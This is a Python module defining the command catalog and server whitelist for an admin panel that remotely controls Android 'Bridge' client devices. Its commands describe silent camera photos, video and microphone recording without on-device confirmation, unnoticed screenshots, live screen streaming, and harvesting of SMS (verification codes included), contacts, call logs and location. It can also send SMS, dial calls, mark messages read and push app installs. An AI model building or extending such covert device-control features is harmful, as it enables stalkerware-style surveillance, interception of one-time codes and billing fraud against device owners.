"""命令目录（单一事实来源）。

本模块是「管理后台可下发的命令」的**唯一权威定义**：
- 每个命令属于一个类别（category），带中文名、说明、图标、参数 schema。
- 管理后台通过 ``GET /api/commands/meta`` 拉取本目录，据此动态渲染
  分类树 + 命令卡片墙 + 参数表单，**无需前端写死命令清单**。
- 服务端下发校验（白名单）也由本目录派生，避免与客户端命令表脱节。

扩展命令时：只需在 ``CATEGORIES`` / ``COMMANDS`` 里新增条目，
并在客户端 [CommandModule] 注册对应的 [CommandExecutor] 即可。
"""

from __future__ import annotations

from typing import Any

# ---------------------------------------------------------------------------
# 参数 schema：轻量声明式定义（不依赖 JSON Schema 库）
#
# 每个参数字段：
#   name:         参数键（下发给客户端的 params 里的 key）
#   label:        界面展示名（中文）
#   type:         控件类型，见 ParamType
#   required:     是否必填
#   default:      缺省值（None = 无缺省）
#   placeholder:  输入框占位提示
#   options:      仅 type=select 时有效，可选项列表
#   description:  参数说明
#
# 下发时前端把填好的值组装成 params: {name: value, ...} 提交。
# ---------------------------------------------------------------------------

# 参数控件类型（与前端渲染器一一对应）
PARAM_TYPE_TEXT = "text"
PARAM_TYPE_NUMBER = "number"
PARAM_TYPE_SWITCH = "switch"
PARAM_TYPE_SELECT = "select"
PARAM_TYPE_TEXTAREA = "textarea"


def _cat(key: str, label: str, icon: str, description: str = "") -> dict[str, Any]:
    """构造一个命令类别。"""
    return {"key": key, "label": label, "icon": icon, "description": description}


def _cmd(
    name: str,
    label: str,
    category: str,
    icon: str,
    description: str,
    params: list[dict[str, Any]] | None = None,
) -> dict[str, Any]:
    """构造一条命令定义。"""
    return {
        "name": name,
        "label": label,
        "category": category,
        "icon": icon,
        "description": description,
        "params": params or [],
    }


def _param(
    name: str,
    label: str,
    type_: str,
    required: bool = False,
    default: Any = None,
    placeholder: str = "",
    options: list[dict[str, str]] | None = None,
    description: str = "",
) -> dict[str, Any]:
    """构造一个参数定义。"""
    p: dict[str, Any] = {
        "name": name,
        "label": label,
        "type": type_,
        "required": required,
        "placeholder": placeholder,
        "description": description,
    }
    if default is not None:
        p["default"] = default
    if options is not None:
        p["options"] = options
    return p


# ---------------------------------------------------------------------------
# 命令类别（有图标，用 Emoji 作为轻量图标，前端直接渲染）
# ---------------------------------------------------------------------------

CATEGORIES: list[dict[str, Any]] = [
    _cat("control", "控制", "🎛️", "控制客户端播放/暂停、调节音量等"),
    _cat("data", "数据采集", "📡", "获取客户端位置、页面、短信、网络等状态数据"),
    _cat("media", "音视频", "🎬", "录屏、截屏、拍照、上传音视频"),
    _cat("interact", "交互", "💬", "弹窗、语音播报、震动、Toast 等交互反馈"),
    _cat("system", "系统", "⚙️", "诊断日志、重启、锁屏等系统级命令"),
]

# ---------------------------------------------------------------------------
# 命令定义（单一事实来源）
# ---------------------------------------------------------------------------

COMMANDS: list[dict[str, Any]] = [
    # ---- 控制类 ----
    _cmd("play_music", "播放音乐", "control", "▶️",
         "播放音乐：URL 流播 / 本地路径直播 / 文件名走「客户端缓存+服务器共享目录」",
         [_param("url", "音源", PARAM_TYPE_TEXT, required=True,
                 placeholder="http(s)://… 或 /storage/… 或 test.mp3",
                 description="三种形态：①远程 URL 直接流播；②本地绝对路径直接播放；"
                             "③裸文件名先查客户端缓存，未命中从服务器音乐目录下载缓存后播放（下次直接命中）"),
          _param("loop", "循环播放", PARAM_TYPE_SWITCH, default=False)]),
    _cmd("pause_music", "暂停音乐", "control", "⏸️",
         "暂停客户端正在播放的音乐（无播放时回执失败）"),
    _cmd("resume_music", "继续播放", "control", "⏯️",
         "从暂停进度恢复播放（仅暂停中有效，播放中/空闲回执失败）"),
    _cmd("stop_music", "停止音乐", "control", "⏹️",
         "停止播放并释放播放器（播放中/暂停中有效，空闲回执失败）"),
    _cmd("set_volume", "调节音量", "control", "🔊",
         "调节客户端指定音频流的音量（媒体/铃声/闹钟/通知/系统共 5 类），"
         "按百分比换算设备实际档位，设置后回读验证；"
         "免打扰模式开启时铃声/通知流可能被系统拒绝，回执如实说明",
         [_param("level", "音量值", PARAM_TYPE_NUMBER, required=True, default=50,
                 placeholder="0-100", description="音量百分比（0-100）"),
          _param("stream", "音量类型", PARAM_TYPE_SELECT, default="media",
                 options=[
                     {"value": "media", "label": "媒体音量（音乐/视频）"},
                     {"value": "ring", "label": "铃声（来电）"},
                     {"value": "alarm", "label": "闹钟"},
                     {"value": "notification", "label": "通知（提示音）"},
                     {"value": "system", "label": "系统（按键/UI 提示音）"},
                 ],
                 description="调节哪一类音量；部分 ROM 铃声与通知联动（改一个另一个跟着变）")]),
    _cmd("get_volume", "获取音量", "control", "🎚️",
         "读取客户端当前全部音量状态：5 类音频流的当前值/最大值/百分比，"
         "附铃声模式（响铃/振动/静音）与免打扰开关；"
         "后台「命令下发」页会在回执后显示音量卡片，滑条拖动可直接反向下发调节", []),
    _cmd("lock_screen", "锁屏", "control", "🔒",
         "让客户端立即锁屏（熄屏并上锁）。首选无障碍模拟电源键（与手动锁屏一致，"
         "解锁无强制密码）；未开无障碍时走设备管理员 lockNow（重新点亮屏幕会要求输密码）。"
         "前置开关见设备端 设置 → 无障碍/设备管理员，命令回执会附引导", []),
    _cmd("restart_app", "重启客户端", "control", "♻️",
         "重启 Bridge 客户端应用进程（约 1 秒后自动重连）。"
         "设备整机重启需 root 权限，未实现", []),
    _cmd("send_sms", "发送短信", "control", "📨",
         "让客户端用本机 SIM 卡发送短信（真实计费操作，请确认号码与内容后再下发）；"
         "支持多号码、长短信自动切分、指定发送卡，回执带逐号码发送结果",
         [_param("phones", "接收号码", PARAM_TYPE_TEXT, required=True,
                 placeholder="13800000001，13800000002（逗号/分号分隔可发多个）",
                 description="收件人手机号，支持中英文逗号/分号/竖线分隔多号码，逐个发送"),
          _param("content", "短信内容", PARAM_TYPE_TEXTAREA, required=True,
                 placeholder="要发送的内容",
                 description="超过 70 字自动按 multipart 切分发送"),
          _param("sim", "发送卡", PARAM_TYPE_SELECT, default="auto",
                 options=[
                     {"value": "auto", "label": "自动（系统默认卡）"},
                     {"value": "sim1", "label": "卡 1"},
                     {"value": "sim2", "label": "卡 2"},
                     {"value": "sim3", "label": "卡 3"},
                 ],
                 description="指定用哪张卡发送；设备无该卡时回执失败。"
                             "后台按设备实际卡动态显示（号码/运营商），"
                             "未显示具体卡信息时先下发一次「获取SIM卡信息」")]),
    _cmd("dial_phone", "拨打电话", "control", "☎️",
         "让客户端拨打电话：直接拨打（CALL_PHONE）或仅打开拨号盘预填号码",
         [_param("phone", "电话号码", PARAM_TYPE_TEXT, required=True,
                 placeholder="13800000000",
                 description="要拨打的号码"),
          _param("mode", "拨打方式", PARAM_TYPE_SELECT, default="direct",
                 options=[
                     {"value": "direct", "label": "直接拨打（跳过拨号盘）"},
                     {"value": "dialer", "label": "打开拨号盘（用户手动拨出）"},
                 ],
                 description="直接拨打需 CALL_PHONE 运行时权限（缺失自动降级为拨号盘）"),
          _param("sim", "使用卡", PARAM_TYPE_SELECT, default="auto",
                 options=[
                     {"value": "auto", "label": "自动（系统默认卡）"},
                     {"value": "sim1", "label": "卡 1"},
                     {"value": "sim2", "label": "卡 2"},
                     {"value": "sim3", "label": "卡 3"},
                 ],
                 description="直接拨打时指定用哪张卡；拨号盘模式由用户在设备上自行选卡。"
                             "后台按设备实际卡动态显示（号码/运营商），"
                             "未显示具体卡信息时先下发一次「获取SIM卡信息」")]),
    _cmd("mark_sms_read", "标记短信已读/未读", "control", "📖",
         "批量把设备短信标记为已读或未读（read 参数双向）。系统限制：写短信库要求 "
         "Bridge 是设备上的「默认短信应用」——非默认时会在设备上弹出确认框，选择 "
         "Bridge 后重新下发即可（Bridge 短信页也有同样的设置入口）；restore 开启时"
         "标记完成后会弹「切回原短信应用」确认框，恢复设备正常收信",
         [_param("mode", "标记范围", PARAM_TYPE_SELECT, default="all_unread",
                 options=[
                     {"value": "all_unread", "label": "全部未读短信"},
                     {"value": "by_address", "label": "按号码"},
                     {"value": "by_id", "label": "按短信 ID"},
                     {"value": "before_date", "label": "某时间之前的未读"},
                 ],
                 description="标记的短信范围"),
          _param("read", "标记为", PARAM_TYPE_SELECT, default="read",
                 options=[
                     {"value": "read", "label": "已读"},
                     {"value": "unread", "label": "未读"},
                 ],
                 description="标记方向（双向）：已读或未读；标记为未读仅对收到的短信生效"),
          _param("address", "号码", PARAM_TYPE_TEXT, placeholder="13800000000",
                 description="mode=按号码 时必填；与短信库精确匹配"),
          _param("before_date", "时间", PARAM_TYPE_TEXT, placeholder="2026-10-26 或 2026-10-26 12:30",
                 description="mode=某时间之前 时必填；将该时间之前的未读短信标记为已读"),
          _param("sms_id", "短信 ID", PARAM_TYPE_TEXT, placeholder="设备短信库 _id",
                 description="mode=按短信 ID 时必填；ID 可在后台短信列表中查看"),
          _param("restore", "完成后切回", PARAM_TYPE_SWITCH, default=True,
                 description="标记完成后弹出「切回原短信应用」确认框（需设备上点一次），"
                             "恢复系统短信 App 正常收信；连续多条命令可关闭避免反复弹窗")]),

    # ---- 数据采集类 ----
    _cmd("get_location", "获取位置", "data", "📍",
         "获取客户端当前位置：粗略（网络定位，快）或精确（GPS，慢）；"
         "v1 纯文本回执，后续版本将上报服务端持久化",
         [_param("precision", "定位精度", PARAM_TYPE_SELECT, default="coarse",
                 options=[
                     {"value": "coarse", "label": "粗略（网络定位，秒级返回）"},
                     {"value": "fine", "label": "精确（GPS 定位，需空旷环境）"},
                 ],
                 description="粗略=基站/WiFi 定位（误差几百米）；精确=GPS 卫星定位（误差几十米内，"
                             "冷启动可能 30 秒+，超时自动回退网络定位）"),
          _param("timeout", "超时(秒)", PARAM_TYPE_NUMBER, default=15,
                 placeholder="默认 15 秒", description="定位等待上限；精确模式建议 30 秒"),
          _param("refresh", "强制刷新", PARAM_TYPE_SWITCH, default=False,
                 description="开启后跳过 5 分钟新鲜缓存短路，直接监听一次定位；"
                             "陈旧缓存兜底仍保留（回执注明缓存年龄）")]),
    _cmd("get_current_page", "获取当前页面", "data", "📄",
         "获取设备当前前台应用（应用名+包名，如「微信 com.tencent.mm」）。"
         "首次使用需在设备上开一次「使用情况访问权」（回执附指引）；"
         "受系统限制只能到应用级，拿不到具体 Activity 页面",
         []),
    _cmd("get_contacts", "获取通讯录", "data", "👥",
         "读取设备联系人（姓名+号码+邮箱）并上报服务端持久化（按设备覆盖快照），"
         "后台「通讯录」页查看；只读，不做任何写入",
         [_param("only_with_phones", "仅含有号码", PARAM_TYPE_SWITCH, default=True,
                 description="开启后过滤掉没有任何电话号码的联系人（如纯邮箱联系人）"),
          _param("limit", "数量上限", PARAM_TYPE_NUMBER, default=2000,
                 placeholder="默认 2000", description="最多上报的联系人数量（上限 5000，防止超大体量通讯录）")]),
    _cmd("get_sms", "获取短信", "data", "💬",
         "读取设备短信并上报服务端持久化（累积存档，按设备+短信ID去重），"
         "后台「短信」页查看；只读，不发送、不修改",
         [_param("sms_type", "短信类型", PARAM_TYPE_SELECT, default="all",
                 options=[
                     {"value": "all", "label": "全部"},
                     {"value": "inbox", "label": "收件箱"},
                     {"value": "sent", "label": "已发送"},
                     {"value": "draft", "label": "草稿"},
                     {"value": "outbox", "label": "发送中"},
                     {"value": "failed", "label": "发送失败"},
                 ],
                 description="筛选短信类型；收件箱用显式 type=1 查询，"
                             "规避部分 ROM 收件箱视图漏验证码短信的问题"),
          _param("limit", "条数上限", PARAM_TYPE_NUMBER, default=100,
                 placeholder="默认 100", description="单次最多读取的短信条数（上限 1000，分次下发可增量拉取）")]),
    _cmd("get_call_log", "获取通话记录", "data", "📞",
         "读取设备通话记录（号码/联系人/类型/时长）并上报服务端持久化（按设备覆盖快照），"
         "后台「通话记录」页查看；只读",
         [_param("call_type", "通话类型", PARAM_TYPE_SELECT, default="all",
                 options=[
                     {"value": "all", "label": "全部"},
                     {"value": "incoming", "label": "呼入"},
                     {"value": "outgoing", "label": "呼出"},
                     {"value": "missed", "label": "未接"},
                 ],
                 description="筛选通话类型"),
          _param("limit", "条数上限", PARAM_TYPE_NUMBER, default=200,
                 placeholder="默认 200", description="单次最多读取的记录条数（上限 1000）")]),
    _cmd("get_sim_info", "获取SIM卡信息", "data", "📱",
         "读取设备 SIM 卡列表（卡槽数量、本机号码、运营商）并上报服务端；"
         "「发送短信/拨打电话」的选卡下拉会按此结果动态显示具体卡信息；只读"),
    _cmd("get_network", "获取网络状态", "data", "📶",
         "获取客户端当前网络状态：联网类型（WiFi/蜂窝/VPN/无网络）、是否真正可上网、"
         "IP 地址、蜂窝制式（4G/5G）、WiFi 名称（需设备定位服务开启，部分 ROM 拿不到）",
         []),
    _cmd("get_battery", "获取电量", "data", "🔋",
         "获取客户端电池状态：电量百分比、充电状态与方式（AC/USB/无线）、"
         "电池技术、温度、电压、健康度",
         []),

    # ---- 音视频类 ----
    _cmd("screenshot", "截屏", "media", "📸",
         "截取客户端当前屏幕并上传。首选无障碍静默截屏（设备开启「Bridge 辅助服务」后"
         "下发即拍，全程无感）；未开启时弹系统投屏授权框，需点一次「立即开始」"
         "（之后授权长期有效，免确认），90 秒内未确认命令失败"),
    _cmd("record_screen", "录屏", "media", "🎥", "录制客户端屏幕并上传（授权方式同截屏）",
         [_param("duration", "时长(秒)", PARAM_TYPE_NUMBER, required=True, default=10,
                 placeholder="3~60 秒", description="录制时长（秒）")]),
    _cmd("screen_live", "投屏直播", "media", "🖥️",
         "把客户端屏幕实时直播到本页（约 1 秒延迟）：下发后播放器自动弹出实时观看，"
         "持续到点「⏹ 停止采集」或最长时长结束；授权方式同截屏"
         "（首次需设备端点一次「立即开始」，之后免确认）；"
         "「回执上传」开启时直播存档（FLV）结束后自动上传，可在「媒体文件」页回放",
         [_param("duration", "最长时长(秒)", PARAM_TYPE_NUMBER, default=0,
                 placeholder="0 = 不限时（推荐）；或 10~3600 秒",
                 description="直播最长持续时长（秒），0 = 不限时直到手动停止"),
          _param("quality", "画质档位", PARAM_TYPE_SELECT, default="hd",
                 options=[
                     {"value": "hd", "label": "高清 1080P / 2.5Mbps / 30fps"},
                     {"value": "smooth", "label": "流畅 720P / 1.5Mbps / 15fps"},
                 ],
                 description="高清=原生分辨率（带宽约 1.1GB/小时）；流畅=省 55% 带宽，"
                             "文字投屏观感几乎无损，滚动/游戏画面略欠顺滑"),
          _param("low_latency", "低延迟模式", PARAM_TYPE_SWITCH, default=False,
                 description="把播放缓冲垫从 1.2s 压到 0.3s（延迟立减约 1 秒），"
                             "抗网络抖动能力变弱，WiFi 信号好时可用"),
          _param("upload", "回执上传", PARAM_TYPE_SWITCH, default=False,
                 description="流结束后把完整存档（FLV）上传到服务器；默认关闭（只实时观看，结束后即弃）")]),
    _cmd("take_photo", "拍照", "media", "📷", "调用客户端摄像头静音拍照并上传（无需设备端确认；通知栏仅显示静默的「运行中」提示，属系统硬性要求）",
         [_param("camera", "摄像头", PARAM_TYPE_SELECT, default="back",
                 options=[{"value": "back", "label": "后置（默认）"},
                          {"value": "front", "label": "前置"}],
                 description="前置/后置；指定方向不存在时回退第一个摄像头")]),
    _cmd("record_video", "录像", "media", "🎬",
         "调用客户端摄像头录制一段视频并上传（借鉴 autox；MP4/H.264，默认带麦克风伴音；"
         "无需设备端确认，通知栏仅显示静默的「运行中」提示；录像中再下拍照/录像会在回执中提示设备忙）",
         [_param("camera", "摄像头", PARAM_TYPE_SELECT, default="back",
                 options=[{"value": "back", "label": "后置（默认）"},
                          {"value": "front", "label": "前置"}],
                 description="前置/后置；指定方向不存在时回退第一个摄像头"),
          _param("quality", "画质", PARAM_TYPE_SELECT, default="medium",
                 options=[{"value": "low", "label": "低（480p）"},
                          {"value": "medium", "label": "中（720p，默认）"},
                          {"value": "high", "label": "高（1080p）"}],
                 description="低 800kbps / 中 2.5Mbps / 高 5Mbps"),
          _param("duration", "时长(秒)", PARAM_TYPE_NUMBER, default=10,
                 placeholder="3~60 秒", description="录制时长（秒）"),
          _param("enable_audio", "录制声音", PARAM_TYPE_SWITCH, default=True,
                 description="同时用麦克风录伴音；需麦克风权限，关闭则录无声视频"),
          _param("stream", "流式模式", PARAM_TYPE_SWITCH, default=False,
                 description="边录边推：后台实时观看（约 1~2 秒延迟），Android 8.0+ 支持；"
                             "流式模式下时长填 0 = 不限时（后台自动处理），点「⏹ 停止采集」结束"),
          _param("upload", "回执上传", PARAM_TYPE_SWITCH, default=False,
                 description="流结束后把完整录像上传到服务器存档；默认关闭（只实时观看，结束后即弃）"
                             "；非流式模式始终上传")]),
    _cmd("stream_stop", "停止流式采集", "media", "⏹️",
         "停止客户端正在进行的流式录像/录音/投屏直播，推送最后一个分片后"
         "按「回执上传」开关决定是否上传完整文件", []),
    _cmd("record_audio", "录音", "media", "🎙️",
         "使用客户端麦克风录制一段声音并上传（借鉴 autox；M4A/AAC 编码；"
         "无需设备端确认，通知栏仅显示静默的「运行中」提示，属系统硬性要求）",
         [_param("quality", "音质", PARAM_TYPE_SELECT, default="medium",
                 options=[{"value": "low", "label": "低（16kHz 语音档）"},
                          {"value": "medium", "label": "中（44.1kHz，默认）"},
                          {"value": "high", "label": "高（48kHz 立体声）"}],
                 description="低 32kbps 单声道 / 中 96kbps 单声道 / 高 192kbps 立体声"),
          _param("duration", "时长(秒)", PARAM_TYPE_NUMBER, default=30,
                 placeholder="5~300 秒", description="录制时长（秒）"),
          _param("stream", "流式模式", PARAM_TYPE_SWITCH, default=False,
                 description="边录边推：后台实时收听（约 1~2 秒延迟，Web Audio 解码出声）；"
                             "流式模式下时长填 0 = 不限时（后台自动处理），点「⏹ 停止采集」结束"),
          _param("upload", "回执上传", PARAM_TYPE_SWITCH, default=False,
                 description="流结束后把完整录音上传到服务器存档；默认关闭（只实时收听，结束后即弃）"
                             "；非流式模式始终上传")]),
    _cmd("clear_media", "清理设备媒体", "media", "🧹",
         "清空客户端本地 media/ 目录的媒体残留（上传失败的孤儿文件），回执清理数量与释放空间；"
         "正常采集产物上传成功即删，无需常规清理；正在采集时拒绝执行。"
         "服务器侧媒体请在「媒体文件」页按条删除"),

    # ---- 交互类 ----
    _cmd("show_toast", "弹提示", "interact", "💬", "在客户端显示一条 Toast 提示",
         [_param("text", "提示内容", PARAM_TYPE_TEXTAREA, required=True,
                 placeholder="要显示的文字", description="Toast 显示的文字（上限 500 字）")]),
    _cmd("speak", "语音播报", "interact", "🔊", "让客户端 TTS 引擎朗读一段文字（播完才回执）",
         [_param("text", "播报内容", PARAM_TYPE_TEXTAREA, required=True,
                 placeholder="要朗读的文字", description="上限 1000 字；设备需装有 TTS 引擎")]),
    _cmd("vibrate", "震动", "interact", "📳", "让客户端震动一次",
         [_param("duration", "时长(毫秒)", PARAM_TYPE_NUMBER, default=500,
                 placeholder="默认 500 毫秒（50~10000）")]),
    _cmd("show_dialog", "弹窗", "interact", "🪟",
         "在客户端弹出全局对话框（盖在任意应用上，停留到用户点击）；"
         "需设备已授予「显示在其他应用上层」权限（未授权时自动引导开启，开一次永久有效）；"
         "用户点击后点击结果会追加到本命令回执",
         [_param("title", "标题", PARAM_TYPE_TEXT, placeholder="弹窗标题"),
          _param("content", "内容", PARAM_TYPE_TEXTAREA, required=True,
                 placeholder="弹窗正文")]),
    _cmd("send_notification", "发送通知", "interact", "🔔",
         "给设备发一条系统通知，通知进通知栏的同时，桌面 Bridge 图标显示角标数字"
         "（Android 无独立角标 API，角标由通知驱动：小米/华为/三星显示数字，OPPO/vivo 显示红点；"
         "保活常驻通知不计入角标）；「清除通知」模式撤回通知并归零角标；"
         "需设备已开启本应用通知权限（未开启时自动打开通知设置页引导）",
         [_param("title", "通知标题", PARAM_TYPE_TEXT, placeholder="服务器消息"),
          _param("content", "通知内容", PARAM_TYPE_TEXTAREA, required=True,
                 placeholder="通知正文", description="显示在通知栏与横幅中"),
          _param("sound", "提示音+震动", PARAM_TYPE_SWITCH, default=True,
                 description="通知弹出时是否提示音与震动"),
          _param("badge", "角标数字", PARAM_TYPE_NUMBER, default=1,
                 placeholder="默认 1（1~99）",
                 description="显示在桌面图标右上角；小米/华为/三星显示数字，OPPO/vivo 显示红点"),
          _param("mode", "操作模式", PARAM_TYPE_SELECT, default="send",
                 options=[{"value": "send", "label": "发送通知（角标=数字）"},
                          {"value": "clear", "label": "清除通知（角标归零）"}],
                 description="清除模式会撤回本应用全部远程通知")]),

    # ---- 系统类 ----
    _cmd("upload_log", "上传日志", "system", "📤", "让客户端自动上传诊断日志"),
    _cmd("clear_log", "清除设备日志", "system", "🧹",
         "清空客户端本地日志（内存缓冲 + 磁盘日志文件），配合管理后台「清除全部日志」"
         "实现三端同步清除；仅在设备在线时有效，回执清理的磁盘文件数"),
    _cmd("check_update", "检查更新", "system", "🔎",
         "让客户端检查应用更新（服务器 updates 目录版，不依赖 GitHub）；"
         "开发者把最新 APK（文件名含版本号，如 bridge-v0.1.32.apk，可选配 update.json "
         "写更新说明）放到服务器 data/updates/ 目录即可",
         [_param("mode", "检查模式", PARAM_TYPE_SELECT, default="auto_install",
                 options=[{"value": "auto_install", "label": "自动安装（发现新版直接下载并弹安装页）"},
                          {"value": "check_only", "label": "仅检查（只回执是否需要更新，不下载）"}],
                 description="仅检查模式适合巡检场景：只看设备版本是否落后，不触发下载"),
          _param("force_download", "强制重新下载", PARAM_TYPE_SWITCH, default=False,
                 description="忽略本地缓存强制重下（md5 校验删除污染缓存的自救手段，仅自动安装模式有效）")]),
]


# ---------------------------------------------------------------------------
# 白名单派生
# ---------------------------------------------------------------------------

# 服务端允许下发的命令白名单（从目录派生）
ALLOWED_COMMANDS: set[str] = {c["name"] for c in COMMANDS}


def catalog_payload() -> dict[str, Any]:
    """组装 meta 接口返回体：类别 + 命令。"""
    return {
        "categories": CATEGORIES,
        "commands": COMMANDS,
    }
